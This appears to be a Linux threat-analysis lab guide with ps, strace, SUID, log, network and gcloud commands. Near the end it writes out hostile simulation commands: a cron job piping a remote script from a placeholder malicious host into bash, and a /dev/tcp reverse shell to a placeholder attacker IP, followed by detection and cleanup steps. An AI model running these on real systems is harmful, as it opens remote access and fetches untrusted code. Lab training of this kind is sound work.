# Lab 1: Linux Threat Analysis
## Part 1: Linux OS Internals - Process Analysis
# Operating Systems
- In-depth knowledge of the inner-workings of operating systems.
- **Focus**: Core concepts including processes, memory management, file systems, and networking.

## Key Topics:
- **Processes**: Creation, scheduling, signals, and privilege escalation techniques.
- **Memory Management**: Virtual memory, shared memory, memory leaks, and swapping.
- **File Systems**: Permissions, symbolic vs. hard links, SUID/SGID, and special files (/dev, /proc).
- **Networking**: TCP/IP stack, tools like netstat, ss, and packet analysis with tcpdump.

## Linux
### Process Analysis
#### Questions
1. Explain the difference between user and kernel space in Linux.
2. What are zombie processes? How would you identify and handle them?
3. Describe the purpose of the /proc directory.
4. How do attackers use SUID files to escalate privileges? How can these be detected?
5. How to view different types of memory? (cached, buffered, free) - `free -m`
6. How to monitor memory swapping? - `vmstat`





### Outputs (Generating Environment)
~/Lab1_Cloud_OS_Threats/
1. Normal Process 
- Process ID: [1] 49766
- Process File: normal_process.sh

2. Root Process
- Process ID: [2] 49772
- Process File: root_process.sh

3. Zombie Process
- Process ID: [3] 49795
- Process File: zombie_process.sh



#### Technical Questions
Practical Tasks:
1. List all running processes
   1. **Command**: `ps aux | awk '{print $1, $2, $3, $4, $11}' | column -t | head`
      1. **Description**: Displays all running processes with details like CPU usage, memory usage, and owner.
      2. Extracts specific fields: **Command**: `awk '{print $1, $2, $3, $4, $11}'`:
         - **$1**: User (who started the process).
         - **$2**: PID.
         - **$3**: CPU usage (%CPU).
         - **$4**: Memory usage (%MEM).
         - **$11**: The command that started the process.
      3. **Command**: `column -t`:
         - **Description**: Formats the output into a table with columns aligned.
      4. **Command**: `head`:
         - **Description**: Displays the first 10 lines of the output.
2. Find Specific Process (**Normal Process** - `49766`, **Root Process** - `49772`, **Zombie Process** - `49795`)
   1. By Process ID
      1. **Command**: `ps aux | grep $PID`
      2. **Command**: `ps -p $PID -o pid,ppid,cmd,%mem,%cpu`
   2. By Process Name
      1. **Command**: `pgrep -lf -u $(id -u) <process_name>`
      2. **Command**: `pgrep -lf -f <process_name>`
      3. **Command**: `pgrep -lf -u $(id -u) <process_name>`
      4. **Command**: `pgrep -lf -f <process_name>`
   3. By Port Number
      1. **Command**: `PID=$(sudo lsof -i :8080 | awk 'NR==2 {print $2}')`
         1. To Kill the Process: `sudo kill -9 $PID`
      2. **Command**: `PID=$(sudo ss -tulpn | grep :8080 | awk -F 'pid=' '{print $2}' | awk -F ',' '{print $1}')`
         1. To Kill the Process: `sudo kill -9 $PID`
      3. **Command**: `PID=$(sudo netstat -tulpn | grep :8080 | awk '{print $NF}' | cut -d'/' -f1)`
         1. To Kill the Process: `sudo kill -9 $PID`
      4. **Command**: `sudo fuser 8080/tcp`
         1. To Kill the Process: `sudo fuser -k 8080/tcp`

4. Trace the system calls of an running process
   1. Base on the Process ID
      1. **Command**: `sudo strace -p $PID`
      2. Trace File Operations **Command**: `sudo strace -e trace=file -p $PID`
      3. Trace Network Operations **Command**: `sudo strace -e trace=network -p $PID`
   2. Base on the Process Name
      1. **Command**: `sudo strace -p $(pgrep -f $PROCESS_NAME)`
      2. Attach to the first process **Command**: `sudo strace -p $(pgrep -f $PROCESS_NAME | head -n 1)`
      3. Attach to the last process **Command**: `sudo strace -p $(pgrep -f $PROCESS_NAME | tail -n 1)`
      4. Attach to the all process **Command**: 
      ```bash
      for pid in $(pgrep -f $PROCESS_NAME); do
         sudo strace -p $pid
      done
      ```
      How To Force stop the above loop:
      `kill -9 $PID`
   3. Base on the File Name
      1. **Command**: `sudo strace -e trace=file -p $(pgrep -f $FILE_NAME)`
   4. Base on the Process Ports
      1. **Command**: `sudo strace -e trace=network -p $(pgrep -f $PORT_NUMBER)`
   5. Trace the system calls of an active process and find the process that is using the most memory.
      1. **Command**: `sudo strace -e trace=all -p $(ps --sort=-%mem -eo pid,comm,%mem | grep "$PROCESS_NAME" | awk 'NR==1 {print $1}')`


5. How to Monitor memory and CPU usage? Find the process that is using the most memory and the process that is using the most CPU.
   1. Monitor memory usage
      1. **Command**: `free -m` 
         1. **Description**: Displays the total amount of memory, used memory, free memory, and shared memory.
      2. **Command**: `free -m | grep Mem`
         1. **Description**: Display only the memory information.
      3. **Command** `free -m | grep Swap`
         1. **Description**: Display only the swap memory information.
      4. **Command** `free -m | grep Mem | awk '{print $3}'`
         1. **Description**: Display only the used memory information.
      5. **Command** `free -m | grep Mem | awk '{print $4}'`
         1. **Description**: Display only the free memory information.
      6. **Command** `free -m | grep Mem | awk '{print $5}'`
         1. **Description**: Display only the shared memory information.
   2. System Memory and Swap Usage Over Time
      1. **Command**: `vmstat 1 5`
         1. **Description**: Displays the system's memory and swap usage over time.
      2. **Command**: `vmstat 1 5 | grep -A 5 'memory'`
         1. **Description**: Filter and display the memory information - Including (free, buff, cache, and swap activity) with 5 lines of data to observe the changes over time.
         2. **Command**: `vmstat 1 5 | grep -A 5 'memory' | awk '{print $4}'`
           1. **Description**: Display only the free memory information.
         3. **Command**: `vmstat 1 5 | grep -A 5 'memory' | awk '{print $5}'`
           1. **Description**: Display only the used memory information.
         4. **Command**: `vmstat 1 5 | grep -A 5 'memory' | awk '{print $6}'`
           1. **Description**: Display only the shared memory information.
         5. **Command**: `vmstat 1 5 | grep -A 5 'memory' | awk '{print $7}'`
           1. **Description**: Display only the buffer memory information.
         6. **Command**: `vmstat 1 5 | grep -A 5 'memory' | awk '{print $8}'`
           1. **Description**: Display only the cache memory information.
         7. **Command**: `vmstat 1 5 | grep -A 5 'memory' | awk '{print $9}'`
           1. **Description**: Display only the swap activity information.           
   4. Monitor Memory Usage Real-Time
      1. **Command**: `atop`
   5. Find the process that is using the most memory
      1. **Command**: `ps aux | sort -k4 -r | head -n 2`
      2. **Command**: `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head`
      3. **Command**: `PID=$(ps aux | sort -k4 -r | head -n 2 | awk '{print $2}')`
   6. Find the process that is using the most CPU
      1. **Command**: `ps aux | sort -k3 -r | head -n 2`
      2. **Command**: `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head`
      3. **Command**: `PID=$(ps aux | sort -k3 -r | head -n 2 | awk '{print $2}')`
   7. Identify CPU Usage For a Specific User
      1. **Command**: `ps -u $USER -o pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head`
   8. Track Top CPU Consumers with Logging
      1. **Command**: `top -b -n 1 | head -15 > /tmp/top_output.txt`

6. Identify Suspicious Processes
   1. **Command**: `ps aux | grep '[.]' | sort -k 3 -r | head`
   2. For Root User: **Command**: `sudo ps aux | grep '[.]' | grep root | sort -k 3 -r | head`
   3. For Current User: **Command**: `ps aux | grep '[.]' | grep $(whoami) | sort -k 3 -r | head`

12. Detect SUID Files in the system
   1. **Command**: `find / -perm -4000` - Find all SUID files in the system.
      1. **Command**: `find ~/L1_Process_Analysis -perm -4000` - Find all SUID files in the Lab  directory.
   2. **Command**: `find / -perm -4000 -exec ls -l {} \;` - Find all SUID files in the system and display their details.
      1. **Command**: `find ~/L1_Process_Analysis -perm -4000 -exec ls -l {} \;` - Find all SUID files in the Lab  directory and display their details.
   3. **Command**: `find / -perm -4000 -exec ls -l {} \; | grep $(whoami)` - Find all SUID files in the system and display their details for the current user.
      1. **Command**: `find ~/L1_Process_Analysis -perm -4000 -exec ls -l {} \; | grep $(whoami)` - Find all SUID files in the Lab  directory and display their details for the current user.

13. Which processes have the highest CPU and memory usage?
   1. **Command**: `PID=$(ps aux | sort -k3 -r | head -n 1 | awk '{print $2}')` - Find the PID of the process with the highest CPU usage.
      1. **Command**: `PID=$(ps aux | sort -k4 -r | head -n 1 | awk '{print $2}')` - Find the PID of the process with the highest memory usage.

14. Identify processes with root privileges.
   1. **Command**: `ps aux | grep root` - Find all processes with root privileges.
   2. **Command**: `ps aux | grep $(whoami)` - Find all processes with the current user's privileges.
   3. **Command**: `ps aux | grep $(whoami) | grep root` - Find all processes with the current user's privileges and root privileges.
   4. **Command**: `ps aux | grep $(whoami) | grep root | sort -k3 -r | head` - Find all processes with the current user's privileges and root privileges and sort them by CPU usage.
   5. **Command**: `ps aux | grep $(whoami) | grep root | sort -k4 -r | head` - Find all processes with the current user's privileges and root privileges and sort them by memory usage.

# Network Analysis
7. Monitor network traffic
8. Monitor firewall rules
11. Inspect the routing table using ip route and identify potential misconfigurations.



16. Create a 2 zombie process, 1 root process, and 1 normal process.
17. Send signals using kill and pkill to kill the zombie processes.







#### GM Commands:
##### Process Analysis:
1. List all running processes
   1. **Command**: `ps aux | awk '{print $1, $2, $3, $4, $11}' | column -t | head`
2. Find Specific Process
   1. **By Process ID `$PID`**: `ps -p $PID -o pid,ppid,cmd,%mem,%cpu --forest`
   2. **By Process Name `$PROCESS_NAME`**: `pgrep -lf "$PROCESS_NAME" | awk '{print $1}' | xargs ps -fp`
   3. **By Port Number `$PORT_NUMBER`**: `sudo netstat -tulpn | grep ":$PORT_NUMBER" | awk '{print $7}' | cut -d'/' -f1`
3. Trace System Calls of a Running Process - Logs all system calls for further offline analysis to identify vulnerabilities.
   1. **By Process ID `$PID`**: `sudo strace -p $PID -e trace=all -o /tmp/strace_output.txt`
   2. **By Process Name `$PROCESS_NAME`**: `sudo strace -p $(pgrep -f "$PROCESS_NAME") -e trace=all -o /tmp/strace_output.txt`
   3. **By Port Number `$PORT_NUMBER`**: `sudo strace -p $(sudo netstat -tulpn | grep ":$PORT_NUMBER" | awk '{print $7}' | cut -d'/' -f1) -e trace=all -o /tmp/strace_output.txt`
4. Memory and CPU Usage - Identify resource-intensive processes for disruption or manipulation and locate memory hogs that may impact system performance or indicate defensive tools.
   1. **Most CPU**: `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head`
   2. **Most Memory**: `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head`
   3. **Most CPU for a Specific User**: `ps -u $USER -o pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head`
   4. **Track Top CPU Consumers with Logging**: `top -b -n 1 | head -15 > /tmp/top_output.txt`
5. Identify Suspicious Processes - Highlight unusual or resource-heavy processes, potentially malicious or defensive.
   1. **Command**: `ps aux | grep '[.]' | awk '{print $2, $3, $4, $11}' | sort -k 3 -r | head`
   2. **For Root User**: `ps aux | grep root | grep '[.]' | awk '{print $2, $3, $4, $11}' | sort -k 3 -r | head`
   3. **For Current User**: `ps aux | grep $(whoami) | grep '[.]' | awk '{print $2, $3, $4, $11}' | sort -k 3 -r | head`
6. Detect SUID Files in the system - Identify and highlight SUID files, which are prime targets for privilege escalation.
   1. **Command**: `find / -perm -4000`
   2. **Command**: `find / -perm -4000 -exec ls -ld {} \; | grep -v "no permission" | tee /tmp/suid_files.txt`
7. Monitor Log Files for Real-Time Changes - Monitor real-time system and authentication logs to detect active defensive actions or login attempts.
   1. **Command**: `tail -f /var/log/syslog`
   2. **Command**: `tail -f /var/log/auth.log`
   3. **Command**: `tail -f /var/log/messages`
   4. **Command**: `tail -f /var/log/secure`
   5. **Command**: `tail -f /var/log/dmesg`
   6. **Command**: `tail -f /var/log/debug`
   7. **Command**: `tail -f /var/log/boot.log`
   8. **Command**: `tail -f /var/log/cron`
   9. **Command**: `tail -f /var/log/maillog`
   10. **Command**: `tail -f /var/log/httpd`
8. Identify Processes with Root Privileges - Targets processes with root privileges for potential privilege escalation.
   1. **Command**: `ps aux | grep root`
   2. **Command**: `ps aux | awk '$1=="root" {print $0}' | sort -k 3 -r | head`
9. Detect Hidden Processes - Identify gaps in process IDs that may indicate hidden or obfuscated processes.
   1. **Command**: `ps aux | awk '{print $2}' | sort -n | comm -23 <(seq 1 $(cat /proc/sys/kernel/pid_max)) -`
   2. **Command**: `ps aux | awk '{print $2}' | sort -n | comm -23 <(seq 1 $(cat /proc/sys/kernel/pid_max)) - | xargs ps -p`
10. Track Resource Utilization Trends - Observe CPU usage trends over time to time attacks during resource peaks.
   1. **Command**: `sar -u 1 10`
11. Track Privileged Files Access - Monitor access to sensitive files for unauthorized modifications or reconnaissance.
   1. **Command**: `auditctl -w /etc/shadow -p rwxa`

12. Identify Network Activity - Analyz established connections to identify potential C2 channels or exposed services.
   1. **Command**: `sudo netstat -antp | grep ESTABLISHED`
   2. **Command**: `sudo netstat -antp | grep LISTEN`
   3. **Command**: `sudo netstat -antp | grep TIME_WAIT`
   4. **Command**: `sudo netstat -antp | grep CLOSE_WAIT`
   5. **Command**: `sudo netstat -antp | grep CLOSE_WAIT | awk '{print $5}' | cut -d':' -f1 | sort | uniq -c | sort -nr`
11. 





2. Find Sensitive Process (**Root Perspective**)
   1. Base on the Process Name  ($PROCESS_NAME= **ssh** \ **apache2** \ **cron** \ etc.)
      1. **Command**: `ps aux | grep $PROCESS_NAME`
      2. **Command**: `pgrep -lf -u $(id -u) $PROCESS_NAME`
      3. **Command**: `pgrep -lf -f $PROCESS_NAME`
      4. **Command**: `pgrep -lf -u $(id -u) $PROCESS_NAME`
      5. **Command**: `pgrep -lf -f $PROCESS_NAME`
   2. Base on the Process Ports ($PORT_NUMBER= **8080** \ **22** \ **80** \ etc.)
      1. **Command**: `PID=$(sudo lsof -i :$PORT_NUMBER | awk 'NR==2 {print $2}')`
         1. To Kill the Process: `sudo kill -9 $PID`
      2. **Command**: `PID=$(sudo ss -tulpn | grep :$PORT_NUMBER | awk -F 'pid=' '{print $2}' | awk -F ',' '{print $1}')`
         1. To Kill the Process: `sudo kill -9 $PID`
      3. **Command**: `PID=$(sudo netstat -tulpn | grep :$PORT_NUMBER | awk '{print $NF}' | cut -d'/' -f1)`
         1. To Kill the Process: `sudo kill -9 $PID`
      4. **Command**: `sudo fuser $PORT_NUMBER/tcp`
         1. To Kill the Process: `sudo fuser -k $PORT_NUMBER/tcp`
2. Trace the system calls of an running process
   1. Base on the Process ID
      1. **Command**: `sudo strace -p $PID`
      2. Trace File Operations **Command**: `sudo strace -e trace=file -p $PID`
      3. Trace Network Operations **Command**: `sudo strace -e trace=network -p $PID`
   2. Base on the Process Name
      1. **Command**: `sudo strace -p $(pgrep -f $PROCESS_NAME)`
      2. Attach to the first process **Command**: `sudo strace -p $(pgrep -f $PROCESS_NAME | head -n 1)`
      3. Attach to the last process **Command**: `sudo strace -p $(pgrep -f $PROCESS_NAME | tail -n 1)`


<!-- 
### System Information
- `uname -a`
- `lsb_release -a`

### Monitor System Resources
- `htop`

### Review /proc Directory to understand proceess information
- `ls -l /proc/`
 -->








#### Technical Answers (Commands and Explanation)
1. **View Running Processes**:
   1. **Command**: `ps aux`
      - **Description**: Displays all processes with details like CPU usage, memory usage, and owner.
      - **Output**: List of all running processes with details (Some Examples are shown below)
      ```bash
      USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
      root           1  0.0  0.3 169432 12760 ?        Ss   10:44   0:06 /sbin/init
      USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
      systemd+     454  0.0  0.1  27416  7484 ?        Ss   10:45   0:00 /lib/systemd/systemd-networkd
      message+     584  0.0  0.1   7584  4668 ?        Ss   10:45   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
      syslog       616  0.0  0.1 224500  5104 ?        Ssl  10:45   0:00 /usr/sbin/rsyslogd -n -iNONE
      daemon       629  0.0  0.0   3804  2136 ?        Ss   10:45   0:00 /usr/sbin/atd -f
      _chrony     1348  0.0  0.0  13024  2344 ?        S    10:45   0:00 /usr/sbin/chronyd -F -1
      galmosh+   11419  0.0  0.2  18968  9584 ?        Ss   14:02   0:00 /lib/systemd/systemd --user
      ```
2. **Find Specific Process**:
   1. **Command**: `ps aux | grep <PID>`
      - **Description**: Displays details of a specific process (replace `<PID>` with the process ID).
      - **Output**: 
      ```bash
      ps aux | grep 51217
      ```
   2. **Command**: `ps -p <PID> -o pid,ppid,cmd,%mem,%cpu`
      - **Example**: `ps -p 51217 -o pid,ppid,cmd,%mem,%cpu`
      - **Description**: Displays details of a specific process (replace `<PID>` with the process ID).
      - **Output**: 
      ```bash
      PID    PPID CMD                         %MEM %CPU
      51217       1 sleep 300                    0.0  0.0
      ```
   3. **Command**: `pgrep -lf -u $(id -u) <process_name>`
      - **Description**: Displays the process ID of a specific process (replace `<process_name>` with the process name). <br> **pgrep**: Searches for processes based on the name or other attributes. <br> **-l**: Displays the process ID (PID) and the process name, providing more details than the default output. <br> **-f**: Matches the full command-line arguments of the process, not just the name. <br> **-u $(id -u)**: Filters processes by the current user's ID to show only processes owned by the user running the command. <br> **sudo**: Checks the processes of the root user Or any other user 
      1. Display the process ID and the process name for **sleep**
         - Example **Command**: `pgrep sleep -l` 
         - **Description**: Displays the process ID (PID) and the process name, providing more details than the default output.
         - **Output**: 
         ```bash
         51217 sleep
         51218 sleep
         51219 sleep
         51221 sleep      
         ```
      2. Search for a Process by Name for **ssh**
         - Example **Command**: `pgrep -lf ssh` 
         - **Description**: Displays the process ID (PID) and the process name, providing more details than the default output.
         - **Output**: 
         ```bash
         51217 ssh
         51218 ssh
         51219 ssh
         51221 ssh      
         ```
      3. Search for Processes by Any User for **ssh**
         - Example **Command**: `sudo pgrep -lf ssh` - Any User Checks the processes of the root user Or any other user 
         - **Description**: Displays the process ID (PID) and the process name, providing more details than the default output.
         - **Output**: 
         ```bash
         866 sshd
         11529 sshd
         11591 sshd
         52136 sudo
         [1]-  Done                    nohup ./normal_process.sh
         [2]+  Done                    nohup sudo ./root_process.sh         
         ```
      3. Search for Processes by current User for **gm_service**
         - Example **Command**: `pgrep -lf -u $(id -u) apache2` - Any User Checks the processes of the root user Or any other user 
         - **Description**: Displays the process ID (PID) and the process name, providing more details than the default output.
         - **Output**: 
         ```bash
         52683 apache2
         52685 apache2
         52686 apache2
         53073 sudo
         ```
      4. Search for Processes Using Full Command for **python**
      - **Command**: `pgrep -lf -f python`
      - **Description**: This matches "python" anywhere in the full command line, such as /usr/bin/python3 script.py.
      - **Output**: 
      ```bash
      611 networkd-dispat
      783 unattended-upgr
      53530 python3
      ```
      5. Search for Processes Using Full Command for **http.server** for current user
      - **Command**: `pgrep -lf -u $(id -u) http.server`
      - **Description**: This matches "http.server" anywhere in the full command line, such as /usr/bin/python3 script.py.
      - **Output**: 
      ```bash
      53530 python3
      ```
         


      



2. **Trace System Calls**:
   - **Command**: `sudo strace -p <PID>`
   - **Description**: Attaches to a running process to see system calls it makes (replace `<PID>` with the process ID).
   - **Output**: 
   ```bash
   sudo strace -p 49766 > normal_process_strace.txt
   sudo strace -p 49772 > root_process_strace.txt
   sudo strace -p 49795 > zombie_process_strace.txt
   echo ""
   echo "Normal Process Strace Output:"
   cat normal_process_strace.txt
   echo ""
   echo "Root Process Strace Output:"
   cat root_process_strace.txt
   echo ""
   echo "Zombie Process Strace Output:"
   cat zombie_process_strace.txt
   ```























### **1. Linux OS Internals: Commands and Explanation**

#### **1.1 Process and Memory Management**
1. **View Running Processes**:
   ```bash
   ps aux | less
   ```
   - **Description**: Displays all processes with details like CPU usage, memory usage, and owner.

2. **Trace System Calls**:
   ```bash
   sudo strace -p <PID>
   ```
   - **Description**: Attaches to a running process to see system calls it makes (replace `<PID>` with the process ID).

3. **Memory Monitoring**:
   ```bash
   free -m
   vmstat 1 5
   ```
   - **Description**: `free -m` shows memory usage in MB. `vmstat` updates memory, swap, and I/O stats every second for 5 seconds.

---

#### **1.2 File System and Storage**
1. **List Files and Permissions**:
   ```bash
   ls -la /etc
   ```
   - **Description**: Lists all files in `/etc` with detailed permissions and attributes.

2. **Search for Configuration Files**:
   ```bash
   find /etc -name "*.conf"
   ```
   - **Description**: Locates `.conf` files in `/etc`.

3. **Disk Usage**:
   ```bash
   df -h
   du -sh /var/*
   ```
   - **Description**: `df` shows disk space usage by mounted filesystems. `du` shows directory size in `/var`.

---

#### **1.3 Network Configuration**
1. **Show Interfaces**:
   ```bash
   ip addr
   ```
   - **Description**: Displays all network interfaces and their IP configurations.

2. **Capture Network Traffic**:
   ```bash
   sudo tcpdump -i eth0 -c 10
   ```
   - **Description**: Captures 10 packets on the `eth0` interface.

3. **Add Firewall Rule**:
   ```bash
   sudo iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
   sudo iptables -D INPUT -p tcp --dport 8080 -j ACCEPT
   ```
   - **Description**: Adds and removes a rule to allow traffic on port `8080`.

---

### **2. Cloud-Specific Commands**

#### **2.1 Validate VPC and Firewall**
1. **List Firewall Rules**:
   ```bash
   gcloud compute firewall-rules list
   ```
   - **Description**: Displays all firewall rules for the project.

2. **Describe the VPC**:
   ```bash
   gcloud compute networks describe cloud-sec-xdr-vpc
   ```
   - **Description**: Shows the configuration of the VPC, including subnets and routing.

---

#### **2.2 Cloud Storage**
1. **Create a Bucket**:
   ```bash
   gcloud storage buckets create my-test-bucket --location=us-central1
   ```
   - **Description**: Creates a storage bucket in the `us-central1` region.

2. **Upload a File**:
   ```bash
   echo "Sensitive data" > sensitive.txt
   gcloud storage cp sensitive.txt gs://my-test-bucket/
   ```
   - **Description**: Uploads a file to the bucket.

---

### **3. Host-Based Threat Analysis**

#### **3.1 Log Analysis**
1. **Analyze SSH Logs**:
   ```bash
   sudo grep "Failed password" /var/log/auth.log
   ```
   - **Description**: Filters for failed SSH login attempts.

2. **Track File Access**:
   ```bash
   sudo auditctl -w /etc/passwd -p wa
   sudo ausearch -f /etc/passwd
   ```
   - **Description**: Tracks write and attribute changes on `/etc/passwd`.

---

#### **3.2 Endpoint Security**
1. **Create a Malicious Cron Job**:
   ```bash
   echo "*/5 * * * * /bin/bash -c 'curl http://malicious-site.com | bash'" | crontab -
   ```
   - **Description**: Creates a cron job to download and execute a malicious script every 5 minutes.

2. **Analyze Cron Jobs**:
   ```bash
   crontab -l
   ```
   - **Description**: Lists all cron jobs for the current user.

---

### **4. Simulate Vulnerabilities**

#### **4.1 Simulate Weak Permissions**
1. **Create a Sensitive File with Weak Permissions**:
   ```bash
   sudo touch /etc/weak_config.conf
   sudo chmod 777 /etc/weak_config.conf
   ```
   - **Description**: Creates a file in `/etc` with permissions that allow any user to read, write, and execute it.

#### **4.2 Install and Expose a Web Server**
1. **Install a Web Server**:
   ```bash
   sudo apt update && sudo apt install apache2 -y
   ```
   - **Description**: Installs Apache.

2. **Host Sensitive Information**:
   ```bash
   echo "Sensitive data exposed" | sudo tee /var/www/html/index.html
   sudo systemctl start apache2
   ```
   - **Description**: Hosts a webpage containing sensitive data.

#### **4.3 Create a Reverse Shell**
1. **Set up a Reverse Shell**:
   ```bash
   echo "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" > /tmp/reverse_shell.sh
   chmod +x /tmp/reverse_shell.sh
   nohup /tmp/reverse_shell.sh &
   ```
   - **Description**: Creates and executes a reverse shell connecting to `<ATTACKER_IP>` on port `4444`.

---

### **5. Post-Vulnerability Testing**

#### **Analyze Vulnerabilities**:
1. **Weak Permissions**:
   ```bash
   find / -perm 777 2>/dev/null
   ```
   - **Description**: Locates world-writable files.

2. **Reverse Shell Detection**:
   ```bash
   netstat -tunlp | grep 4444
   ```
   - **Description**: Identifies connections to port `4444`.

3. **Log Analysis**:
   ```bash
   sudo tail -f /var/log/apache2/access.log
   ```
   - **Description**: Monitors access logs for the web server.

---

### **6. Cleanup**
- **Remove Vulnerabilities**:
  ```bash
  sudo rm /etc/weak_config.conf
  sudo systemctl stop apache2
  crontab -r
  pkill -f reverse_shell.sh
  ```
  - **Description**: Cleans up created vulnerabilities.

